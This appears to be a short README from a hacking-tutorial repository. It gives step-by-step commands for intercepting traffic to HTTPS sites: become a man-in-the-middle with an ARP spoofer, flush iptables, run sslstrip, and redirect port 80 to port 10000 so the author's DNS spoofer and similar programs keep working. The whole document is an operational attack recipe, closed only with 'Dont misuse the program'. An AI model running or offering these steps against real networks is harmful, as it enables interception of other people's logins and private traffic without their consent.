The programs (which we are using on websites) will work only for http sites. 
In order to run those programs on HTTPS sites we follow the following instructions:
## Steps to execute the program:

1. <ins> Become man-in-the-middle</ins>: In order to be a man-in-the-middle, you 
need to execute the ARP Spoofer.
 
2. <ins>flush the iptables:</ins>
        
		'''
		iptables --flush
		''' 

3. <ins>Running sslstrip:</ins>
For this just type the command 
		
		'''
		sslstrip
		'''

4. Run the following command:
		
		'''
		iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
		'''

5. Then run the program (like DNS_spoofer) in the same way as executed previously.
6. Dont forget to change port 80 to port 10000 at those places where port 80 has been used.   

![sslstrip](https://user-images.githubusercontent.com/68290275/91204652-0363d500-e722-11ea-8cce-048ffe39a243.jpg)
image_source: zsecurity.org

### Note:

- The program is to be run through command line (linux).
- Dont misuse the program.
